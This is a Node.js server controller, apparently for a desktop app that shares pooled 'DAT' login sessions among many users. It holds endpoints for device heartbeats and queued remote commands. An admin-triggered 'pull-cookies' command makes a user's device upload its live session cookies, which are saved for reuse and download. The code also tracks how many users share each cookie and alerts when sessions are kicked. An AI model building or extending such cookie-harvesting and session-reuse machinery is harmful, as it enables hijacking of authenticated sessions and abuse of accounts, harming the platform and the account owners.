const mongoose = require('mongoose');
const User = require('../models/User');
const Cookie = require('../models/Cookie');
const DeviceCommand = require('../models/DeviceCommand');
const {
  normalizeCookiePayload,
  countCookiesInData
} = require('../utils/cookies');
const { logActivity } = require('../services/activityLogService');
const sessionAlerts = require('../services/sessionAlerts');

/** A device is considered online if it has beaten within this window. */
const PRESENCE_ONLINE_WINDOW_MS = 90 * 1000;

function isOnline(presence) {
  if (!presence?.lastSeenAt) return false;
  return Date.now() - new Date(presence.lastSeenAt).getTime() < PRESENCE_ONLINE_WINDOW_MS;
}

function presenceView(presence) {
  const p = presence || {};
  const online = isOnline(p);
  const state = online ? p.state || 'dashboard' : 'offline';
  return {
    state,
    online,
    datOpen: online ? Boolean(p.datOpen) : false,
    datVisible: online ? Boolean(p.datVisible) : false,
    lastSeenAt: p.lastSeenAt || null,
    datOpenedAt: p.datOpenedAt || null,
    appVersion: p.appVersion || '',
    platform: p.platform || ''
  };
}

function normalizeState(value) {
  const s = String(value || '').trim().toLowerCase();
  if (s === 'dat' || s === 'dashboard' || s === 'offline') return s;
  return 'dashboard';
}

/**
 * POST /presence/heartbeat  (any authenticated user)
 * Stores the device's current state and returns commands it should execute.
 */
async function heartbeat(req, res) {
  try {
    const state = normalizeState(req.body?.state);
    const datOpen = state === 'dat' || Boolean(req.body?.datOpen);
    const datVisible = datOpen && Boolean(req.body?.datVisible);

    const user = await User.findById(req.user.userId).select('presence');
    if (!user) {
      return res.status(401).json({ message: 'User not found' });
    }

    const prev = user.presence || {};
    const nowDate = new Date();
    // The device reports which DAT cookie/account it currently has open, so admins can see
    // how many users are on each cookie right now.
    let datCookieId = null;
    if (datOpen && req.body?.cookieId && mongoose.Types.ObjectId.isValid(req.body.cookieId)) {
      datCookieId = new mongoose.Types.ObjectId(String(req.body.cookieId));
    }
    user.presence = {
      state,
      datOpen,
      datVisible,
      lastSeenAt: nowDate,
      datOpenedAt: datOpen ? prev.datOpenedAt || nowDate : null,
      appVersion: String(req.body?.appVersion || prev.appVersion || '').slice(0, 40),
      platform: String(req.body?.platform || prev.platform || '').slice(0, 40),
      datCookieId
    };
    user.markModified('presence');
    await user.save({ validateBeforeSave: false });

    // Claim pending commands for this device (flip to running so a second
    // heartbeat does not hand them out twice).
    const pending = await DeviceCommand.find({
      userId: user._id,
      status: 'pending'
    })
      .sort({ createdAt: 1 })
      .limit(10);

    const commands = [];
    for (const cmd of pending) {
      cmd.status = 'running';
      cmd.deliveredAt = nowDate;
      await cmd.save();
      commands.push({ id: String(cmd._id), type: cmd.type });
    }

    return res.json({ ok: true, commands });
  } catch (error) {
    console.error('[PRESENCE] heartbeat error:', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
}

/**
 * POST /presence/commands/:id/result  (the owning device)
 * The desktop app posts the outcome of a command it executed.
 */
async function submitCommandResult(req, res) {
  try {
    const cmd = await DeviceCommand.findById(req.params.id);
    if (!cmd) {
      return res.status(404).json({ message: 'Command not found' });
    }
    if (String(cmd.userId) !== String(req.user.userId)) {
      return res.status(403).json({ message: 'This command is not for your device' });
    }
    if (cmd.status === 'done') {
      return res.json({ ok: true, command: cmd.toSafeJSON() });
    }

    const ok = req.body?.status !== 'error' && !req.body?.error;
    cmd.completedAt = new Date();

    if (!ok) {
      cmd.status = 'error';
      cmd.error = String(req.body?.error || 'Device reported an error').slice(0, 500);
      await cmd.save();
      return res.json({ ok: true, command: cmd.toSafeJSON() });
    }

    if (cmd.type === 'pull-cookies') {
      const normalized = normalizeCookiePayload(req.body?.cookies || req.body?.result || {});
      const cookieCount = countCookiesInData(normalized);
      if (!cookieCount) {
        cmd.status = 'error';
        cmd.error = 'No DAT session cookies were found on the device.';
        await cmd.save();
        return res.json({ ok: true, command: cmd.toSafeJSON() });
      }

      cmd.result = normalized;
      cmd.cookieCount = cookieCount;

      // Also persist as a Cookie record so admins can reuse/activate it.
      try {
        const owner = await User.findById(cmd.userId).select('email name');
        const safeEmail = String(owner?.email || 'user').replace(/[^a-zA-Z0-9._-]/g, '_');
        const fileName = `${Date.now()}-pull-${safeEmail}.json`;
        const fileSize = Buffer.byteLength(JSON.stringify(normalized), 'utf8');
        const cookieDoc = await Cookie.create({
          fileName,
          data: normalized,
          filePath: '',
          cookieCount,
          hasCookies: cookieCount > 0,
          fileSize,
          source: 'device-pull',
          label: 'new',
          sessionName: owner?.email || '',
          note: `Pulled from ${owner?.email || cmd.userId} by ${cmd.requestedByEmail || 'admin'}`,
          lastUpdated: new Date()
        });
        cmd.cookieId = cookieDoc._id;
      } catch (err) {
        console.warn('[PRESENCE] could not save pulled cookie doc:', err.message);
      }

      cmd.status = 'done';
      await cmd.save();

      await logActivity({
        userId: cmd.userId,
        actorEmail: cmd.requestedByEmail,
        action: 'admin.cookie_pull',
        category: 'admin',
        status: 'success',
        message: `Pulled ${cookieCount} fresh DAT cookies from device`,
        meta: { commandId: String(cmd._id), cookieId: cmd.cookieId ? String(cmd.cookieId) : null }
      });

      return res.json({ ok: true, command: cmd.toSafeJSON() });
    }

    cmd.status = 'done';
    await cmd.save();
    return res.json({ ok: true, command: cmd.toSafeJSON() });
  } catch (error) {
    console.error('[PRESENCE] submit result error:', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
}

/* ----------------------------- Admin endpoints ---------------------------- */

/**
 * POST /presence/admin/users/:userId/pull-cookies
 * Queue a fresh-cookie pull for a user's device.
 */
async function requestCookiePull(req, res) {
  try {
    const user = await User.findById(req.params.userId).select('email presence');
    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    // Reuse an outstanding request rather than stacking duplicates.
    const existing = await DeviceCommand.findOne({
      userId: user._id,
      type: 'pull-cookies',
      status: { $in: ['pending', 'running'] }
    }).sort({ createdAt: -1 });

    const cmd =
      existing ||
      (await DeviceCommand.create({
        userId: user._id,
        type: 'pull-cookies',
        status: 'pending',
        requestedBy: req.user.userId,
        requestedByEmail: req.user.email || ''
      }));

    await logActivity({
      userId: user._id,
      actorEmail: req.user.email,
      action: 'admin.cookie_pull_request',
      category: 'admin',
      status: 'info',
      message: `Queued fresh-cookie pull for ${user.email}`,
      meta: { commandId: String(cmd._id) },
      req
    });

    return res.status(201).json({
      command: cmd.toSafeJSON(),
      presence: presenceView(user.presence),
      reused: Boolean(existing)
    });
  } catch (error) {
    console.error('[PRESENCE] request pull error:', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
}

/** GET /presence/admin/commands/:id — poll command status. */
async function getCommand(req, res) {
  try {
    const cmd = await DeviceCommand.findById(req.params.id).select('-result');
    if (!cmd) {
      return res.status(404).json({ message: 'Command not found' });
    }
    return res.json({ command: cmd.toSafeJSON() });
  } catch (error) {
    console.error('[PRESENCE] get command error:', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
}

/** GET /presence/admin/commands/:id/download — download the pulled cookie JSON. */
async function downloadCommandResult(req, res) {
  try {
    const cmd = await DeviceCommand.findById(req.params.id);
    if (!cmd) {
      return res.status(404).json({ message: 'Command not found' });
    }
    if (cmd.status !== 'done' || !cmd.result) {
      return res.status(409).json({ message: 'Result is not ready yet' });
    }
    const owner = await User.findById(cmd.userId).select('email');
    const safeEmail = String(owner?.email || 'user').replace(/[^a-zA-Z0-9._-]/g, '_');
    const fileName = `dat-cookies-${safeEmail}-${Date.now()}.json`;
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', `attachment; filename="${fileName}"`);
    return res.send(JSON.stringify(cmd.result, null, 2));
  } catch (error) {
    console.error('[PRESENCE] download result error:', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
}

/**
 * POST /presence/report-dead  (any authenticated user)
 * The desktop app reports that its DAT session was kicked to the login page (a logout).
 * Body: { cookieId }. We track distinct users per cookie and alert admins past a threshold.
 */
async function reportDead(req, res) {
  try {
    const cookieId = String(req.body?.cookieId || '').trim();
    if (!cookieId || !mongoose.Types.ObjectId.isValid(cookieId)) {
      return res.status(400).json({ message: 'Valid cookieId is required' });
    }
    let fileName = '';
    try {
      const doc = await Cookie.findById(cookieId).select('fileName').lean();
      fileName = doc?.fileName || '';
    } catch {
      // ignore lookup failure
    }
    const result = sessionAlerts.reportDead({
      cookieId,
      userId: req.user.userId,
      fileName
    });
    if (result.alert) {
      console.warn(
        `[SESSION_ALERT] ${result.count} users report cookie ${fileName || cookieId} dead within ${Math.round(
          sessionAlerts.WINDOW_MS / 60000
        )}m`
      );
    }
    return res.json({ ok: true, deadUsers: result.count, alert: result.alert });
  } catch (error) {
    console.error('[PRESENCE] report-dead error:', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
}

/**
 * GET /presence/admin/live  (admin)
 * Live operational snapshot for the admin dashboard: per-cookie active-user counts (devices
 * with DAT open right now) and session-death alerts (cookies many users just got kicked off).
 */
async function getLiveStatus(req, res) {
  try {
    const since = new Date(Date.now() - PRESENCE_ONLINE_WINDOW_MS);
    // Count online devices with DAT open, grouped by the cookie they have open.
    const rows = await User.aggregate([
      { $match: { 'presence.datOpen': true, 'presence.lastSeenAt': { $gte: since }, 'presence.datCookieId': { $ne: null } } },
      { $group: { _id: '$presence.datCookieId', users: { $sum: 1 } } }
    ]);
    const activeUsersByCookie = {};
    for (const r of rows) activeUsersByCookie[String(r._id)] = r.users;

    const alerts = sessionAlerts.currentAlerts();
    return res.json({
      activeUsersByCookie,
      alerts,
      threshold: sessionAlerts.ALERT_THRESHOLD,
      windowMs: sessionAlerts.WINDOW_MS,
      at: new Date().toISOString()
    });
  } catch (error) {
    console.error('[PRESENCE] live status error:', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
}

module.exports = {
  heartbeat,
  submitCommandResult,
  requestCookiePull,
  getCommand,
  downloadCommandResult,
  reportDead,
  getLiveStatus,
  presenceView,
  isOnline,
  PRESENCE_ONLINE_WINDOW_MS
};
